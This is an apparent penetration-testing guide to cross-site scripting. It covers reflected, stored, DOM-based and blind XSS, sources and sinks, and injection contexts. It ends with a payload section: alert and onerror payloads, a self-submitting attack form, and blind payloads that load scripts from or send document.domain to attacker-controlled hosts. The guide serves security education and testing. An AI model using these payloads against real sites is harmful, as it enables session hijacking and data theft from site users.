<!---------------------------------------------------------------------------------
Copyright: (c) BLS OPS LLC.
This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, version 3.
This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
GNU General Public License for more details.
You should have received a copy of the GNU General Public License
along with this program. If not, see <https://www.gnu.org/licenses/>.
--------------------------------------------------------------------------------->
# Cross-Site Scripting (XSS)
### References
* References
	* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

### Overview


#### Why is it called cross-site scripting?

Cross-site scripting is a terrible name. It was introduced by Microsoft in January of 2000. To be fair to them, at the time it made a lot more sense. The first XSS attacks were what we'd call link-based reflected-XSS today: fragments of HTML/Javascript code placed into the parameters of a URL in a link, which is placed on an unrelated 3rd party site. Yes, technically this is a "cross-site" attack, but here is the problems with it:
* There are few places on the modern internet where you can simply embed a working link today
* Phishing is a much more prevalent delivery mechanism for delivering a malicious URL, and is in fact not a "site".
* Stored XSS has **absolutely nothing** to do with another site.

Therefore, for people who are very new to web hacking, it can be a confusing term. Especially with all of the other "cross-site" attacks, like cross-site request forgery (which is actually a great name for that attack).

A much better way to think of XSS is simply **Javascript Injection**. Technically, its usually the injection of HTML and Javascript, and sometimes CSS even gets involved... but it's a much cleaner term conceptually.

With that being said, sadly the name isn't going anywhere, so lets talk about Cross-site Scripting.

#### Understanding the impact of XSS

Cross-site scripting is one of the most (and least) well understood web vulnerabilities.

Even the greenest web pentester understands how to find basic XSS vulnerabilities. It's also by far the most common web vulnerability, accounting for roughly 60% percent of all successful bounty reports on hackerone. In it's basic form, it's fairly trivial to exploit. Web scanners are particularly adept at finding XSS in relation to other types of vulnerabilities. 

The impact of XSS varies wildly depending on the particular details of an individual case. A stored-XSS on a banking website that executes for every user is far more serious than a reflected-XSS on an obscure page of a non-critical application. XSS has a stubborn and pervasive reputation of being relatively harmless. As a result, it may not be taken seriously enough when reported. *Perhaps this is due in part to the popular use of the alert box as a proof-of-concept*.  In the right situation, an XSS can completely devastate an organization and serve as a steppingstone to full compromise. Try to go beyond a simple alert box when building a payload and demonstrate actual impact whenever possible.

When assessing the impact of an XSS, consider the following factors:

* **Reflected vs. Stored**: The key difference is reflected XSS (and most DOM-based XSS) require user-interaction, typically in the form of clicking a malicious link. This raises the complexity of the attack, requiring the inclusion of a phishing campaign or other delivery mechanism, along with relying on the carelessness of a user. 

* **Location of the vulnerability** (stored only): Stored XSS can occur on common, high traffic pages or it might exist on an obscure URL the user would never visit through normal browsing (maybe even requiring a phishing link to get them there). 

* **Sensitivity of the content**: XSS on a page hosting nothing but public, static content is close to worthless. A successful exploitation in such a case might only be useful in directing a victim to another, vulnerable site. On the other hand, a site which (after successful login) displays highly sensitive content to the user might have devastating consequences if accessible to an attacker. 

* **HttpOnly flag**: The HttpOnly flag, when enabled on a cookie, renders the cookie inaccessible to Javascript. This means that even in the event of XSS, the attacker would not have access to that cookie. Cookies are frequently used as security tokens. Without access to sensitive cookies, an XSS exploit might not be all that useful to an attacker.  

* **Reflected headers**: If you can find a page that reflects the headers you are sending back, this eliminates any protection that the HttpOnly flag provides as the cookies will once again be accessible by Javascript via the content of the page.

* **Payload limitations**: Sometimes the injection point will have a hard limit on the number of characters it will accept, limiting the options for a payload. There may also be particular characters that are blocked. 

* **Browser specific payloads**: Some payload will only work in some browsers and not others. Traditionally, there have been a lot of "internet explorer only" payloads, but you might find one that only words on Chrome or only works on Firefox, etc.

### Types of XSS

#### Reflected

Reflected XSS occurs when the malicious payload is **fully included within a single request** and reflected back somewhere in the response to that request. Most commonly, this will come in the form of a GET parameter in the URL. However, it could be in a POST parameter, or anywhere in the message body for that matter. 

###### A note about POST-based XSS

Do not assume if the request requires a POST that it is not exploitable! Many POST based-XSS vulnerabilities can be exploited by hosting an attacker-controlled page with Javascript configured to generate the malicious POST request. Then, deliver the attacker page to the victim instead. There may be extra hurdles to overcome for this to work - for example, you might also need misconfigured CORS headers on the site for the victim’s browser to send the request. If the request requires the victim to be logged in, you might further need the **Access-Control-Allow-Credentials** header to be set. Given all that, its worth trying a "**method flip**" (in Burp, right click on the request in the repeater tab and select '**change request method**') to see if the server will accept the same parameters as GET parameters. It often will, and that makes the payload a bit more exploitable. 

Reflected XSS can even be delivered via malicious HTTP headers! Most common headers are banned by browsers from being set manually in an AJAX request. However, many others can be set via an AJAX request on an attacker controlled page - similar to how a POST-based exploit might be delivered. Even if the offending header is blocked by the browser, don't give up! You may still be able to exploit it using web cache poisoning. 


#### Stored

Stored XSS occurs when some unsanitized input from an attacker is stored by the server in some way, where it is subsequently delivered to the victim in another request. Stored XSS is usually the most dangerous variety because it doesn't require direct user-interaction. If placed on a high-traffic page, it may affect hundreds or thousands of users simultaneously.

When stored XSS payloads make their way into secondary systems which are interconnected to the initial victim server, this is referred to as 2nd order XSS. 

When the payload only executes on your own account, this is called self-XSS. Many do not consider this to be a finding at all. However, this a dangerous perspective as these "unexploitable" vulnerabilities are perfect companions to pair with infrastructure attacks like web cache poisoning or HTTP request smuggling, which can turn a harm-less self-xss into a devastating compromise.

#### DOM-Based

DOM-based XSS occurs when Javascript takes data from attacker-controlled sources and handles it insecurely by passing it into a "sink" that supports code execution.

DOM-based XSS is often confused with reflected XSS because, in many cases, the URL itself is the source of the malicious payload. The easiest way to differentiate what is and isn't DOM-based, is whether or not you can see the payload when you view the source of the page. If it's only present when you **inspect** the page, it's DOM-based: even if it was introduced via the URL the way reflected-XSS would be.

##### Sources and Sinks

DOM-based XSS is all about **sources** and **sinks**.

**Sources** are places where payloads can be introduced, as described below:

###### Location / Document URL / URL:

* document.URL
* document.documentURI
* location 
* location.href
* location.search
* location.hash

*(location is interchangeable with window.location and document.location)*

###### Referrer:

* document.referrer

###### Window Name

* window.name

**Sinks** are places where data introduced via sources may result in execution:

###### Direct Execution:

* eval
* setTimeout
* setInterval

###### HTML Element (can usually result in execution as well):

* document.write
* document.writeIn
* document.innerHTML
* document.outerHTML

###### Set Location (these can basically be used for a DOM-based open-redirect):

* location
* location.href


To discover DOM-based XSS, you can place a canary in the various sources and see how they get integrated into the DOM. The HTML based sinks are usually much easier to find vulnerabilities with, because you can inspect the source of the page to look for the canary. However, with the Javascript-based sinks, it may be impossible to spot the canary without using the browser's debugger. 

Although you should certainly take the time to learn how to manually find these vulnerabilities, Burp includes a Javascript analyzer that is quite adept at locating many DOM-XSS vulnerabilities. It is particularly helpful for more difficult to spot Javascript-sink based varieties. Performing an active scan on an endpoint will automatically trigger the Javascript analyzing engine. 

#### Blind

Blind XSS is a variant of Stored-XSS where there is no way to validate or confirm that a given payload was successful. This occurs when the attacker has access to the a vulnerable input, but not its output. A common scenario would be a form where the user can submit data that only an admin can see. Another would be an admin-only utility that renders web logs in a web-based log-viewer. Blind XSS payloads require some guess-work and a bit of luck. The attacker can construct a payload that will call back to an attacker controlled web server (or Collaborator server) for confirmation of exploitation.

### The importance of context (*Doesn't apply to DOM-XSS*)

When you notice your content is being reflected and are assessing the potential for an XSS vulnerability, the first thing you should attempt to do is figure out what context your data is being inserted into. The context determines which characters that will be required, and what "setup" (if any) will need to come before and/or after the payload to ensure you don't break the page and prevent your exploit from executing.

To find your context, use a canary. This is simply a unique string that won't appear elsewhere in your page that you can search for when you view the source of the page.


#### Context 1: Between HTML tags

Basically, if you don't land inside of an existing tag or attribute, you are in this context. The important thing to remember here is that you WILL need to create your own tag to get anything to work. If you are in this context and "<" and ">" is blocked, you are probably out of luck. 

This is where your traditional payloads like:

```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

will work. 

#### Context 2: HTML tag attributes

If you land inside of an HTML tag attribute, you might have to do a bit more work on your payload as you will need to escape from this context vs. For example, this slightly modified payload:

```
"><script>alert(document.domain)</script>
```

Will close out of whatever attribute you landed in - putting you back in "Between HTML tags" context.

However, this isn't always necessary. Depending on what attribute you have landed in, you might be able to execute code immediately by doing something like `javascript:alert(document.domain)`. A good example would be if you landed inside of a `<body onload="">` attribute. 

If you are inside of an attribute that is NOT executable, and you are unable to use a " in your payload to escape it, it is unlikely you will be able to achieve XSS. 

#### Context 3: Injection into Javascript

You may be injecting directly into existing Javascript. Although you would think this would be the easiest to exploit, it can get messy. You have to find away to insert your code without breaking the existing code. If you are, for example, injecting inside of a variable assignment: 

```
var x = 'you are injecting here'
```

You may simply be able to close the string with a ', followed by a ; to terminate the statement at which point you can insert your own Javascript. This may break code **after** yours, so you might need to end your payload with some setup that plays nicely with whatever is coming next.


Don't forget about single line HTML comments if you are trying to push away some unwanted code after yours on the same line (//).


#### Context 4: Template Literals

Template literals are a way for Javascript expressions to be included directly in strings. If you encounter a string surrounded by backticks ` instead of quotes, this is a template literal. Within the template literal, Javascript expressions can be included in the following format:

```
${document.domain}
```

If you find yourself injecting into this context, you do not need to insert a backtick. Instead, simply place your payload inside the ${...} syntax.


### General XSS tips

* If you are getting user-supplied data to render and it is unencoded, there is almost certainly a way to make it exploitable, don't give up! Sometimes most of the trouble making an XSS payload work can just be repairing the code around it so you don't break execution.
* WAFs are not your friend when it comes to XSS. They are generally quite effective at stopped the vast majority of XSS payloads. The problem is, this provides a false sense of security. Fancy new payloads are dumped onto twitter all the time, and usually take a few days for WAFs to be reconfigured to stop them. All an adversary needs to do is wait for one of these payloads to go public, and they can get their payload through a WAF long enough to use it. This is why whenever possible, do your testing while bypassing the WAF.
* Sometimes, you can get XSS without access to the DOM. This type of XSS is much less impactful. Therefore, it's always a good idea to use a payload that proves access to the dom... like grabbing the value of **document.domain** or **document.cookie**.


## Resources

* PortSwigger WebAcademy - XSS (excellent reading and labs) [https://portswigger.net/web-security/cross-site-scripting](https://portswigger.net/web-security/cross-site-scripting)
* OWASP - XSS [https://owasp.org/www-community/attacks/xss/](https://owasp.org/www-community/attacks/xss/)
* DomGoat - DOM Security Learning Platform [https://domgo.at/cxss/sinks](https://domgo.at/cxss/sinks)
* Pentesterlab - As always, fantastic labs on every web attack [https://pentesterlab.com](https://pentesterlab.com)

## Tools

Plain old Burpsuite is the way to go. The built in scanner is great at finding all types of XSS. Add in the  [Reflected Parameters burp extension](https://portswigger.net/bappstore/8e8f6bb313db46ba9e0a7539d3726651) to help identify some potentially XSS that might be too hard for the scanner.

## Payloads

##### Super basic payloads

These are your go-to payloads when you don't think there is any filtering at all

```
<script>alert(document.domain)</script>
<SCRIPT SRC=http://yoursite.com/externalscript.js></SCRIPT>
<img src=x onerror="alert(document.domain)">
<body onload=alert(1)>
```

##### PortSwigger XSS Cheatsheet

Your first stop when it comes to general XSS payloads (if the super basic ones dont work) is PortSwigger's XSS cheat sheet [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet). This is a regularly maintained repository of all kinds of XSS vectors, with contributions from countless security researchers. These are the kind of payloads you will use after you find that you have reflection, and are trying to defeat some kind of XSS filter. 

##### POST-based payloads

*With POST-based payloads, you need to host them on your site and trigger a request to another site.*

Here is an example of a generic attacker-site HTML page using a self-submitting form:

```
<form name=TheForm action=https://vulnerable-site.com/login method=post>
<input type=hidden name=username value='"a><script>alert(document.domain)</script>'>
<input type=hidden name=password value=test>
<input type=hidden name=login value=Login>
</form>
<script>
document.TheForm.submit();
</script>
```

##### Blind XSS payloads 

*Blind XSS payloads are designed to let you know when they are triggered through a request to a server you control*

**Simple payload**:

```
<script src=//yourdomain.com></script>
```

**With secondary payload (that you host)**:

```
<script>function b(){(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//yourdomain.burpcollaborator.net/" + morexss.txt);a.send();</script>
```
**Prove DOM access by sending document.domain**:

```
<script>a=new XMLHttpRequest();a.open("GET", "//yourdomain.burpcollaborator.net/" + document.domain);a.send();</script>
```

**Alternate with IMG tag**: 

```
<script>document.write("<img src='https://yourdomain.burpcollaborator.net/' + document.domain>")</script>
```




